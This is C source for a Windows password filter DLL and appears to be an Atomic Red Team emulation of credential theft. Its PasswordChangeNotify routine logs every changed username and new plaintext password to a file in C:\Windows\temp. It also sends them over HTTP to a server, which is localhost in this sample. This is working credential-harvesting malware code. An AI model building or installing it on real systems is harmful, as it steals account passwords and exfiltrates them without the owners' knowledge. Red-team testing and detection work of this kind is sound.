#include <windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <ntsecapi.h>

void writeToLog(const char* szString)
{
    FILE* pFile = fopen("c:\\windows\\temp\\logFile.txt", "a+");
    if (NULL == pFile)
    {
        return;
    }
    fprintf(pFile, "%s\r\n", szString);
    fclose(pFile);
    return;
}



// Default DllMain implementation
BOOL APIENTRY DllMain(HANDLE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    OutputDebugString(L"DllMain");
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

BOOLEAN __stdcall InitializeChangeNotify(void)
{
    OutputDebugString(L"InitializeChangeNotify");
    writeToLog("InitializeChangeNotify()");
    return TRUE;
}

BOOLEAN __stdcall PasswordFilter(
    PUNICODE_STRING AccountName,
    PUNICODE_STRING FullName,
    PUNICODE_STRING Password,
    BOOLEAN SetOperation)
{
    OutputDebugString(L"PasswordFilter");
    return TRUE;
}

NTSTATUS __stdcall PasswordChangeNotify(
    PUNICODE_STRING UserName,
    ULONG RelativeId,
    PUNICODE_STRING NewPassword)
{
    FILE* pFile = fopen("c:\\windows\\temp\\logFile.txt", "a+");
    //HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
    HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; AtomicRedTeam; Trident/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hSession = InternetConnect(hInternet, L"127.0.0.1", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hReq = HttpOpenRequest(hSession, L"POST", L"/", NULL, NULL, NULL, 0, 0);
    char* pBuf = "SomeData";



    OutputDebugString(L"PasswordChangeNotify");
    if (NULL == pFile)
    {
        return;
    }
    fprintf(pFile, "%ws:%ws\r\n", UserName->Buffer, NewPassword->Buffer);
    fclose(pFile);
    InternetSetOption(hSession, INTERNET_OPTION_USERNAME, UserName->Buffer, UserName->Length / 2);
    InternetSetOption(hSession, INTERNET_OPTION_PASSWORD, NewPassword->Buffer, NewPassword->Length / 2);
    HttpSendRequest(hReq, NULL, 0, pBuf, strlen(pBuf));

    return 0;
}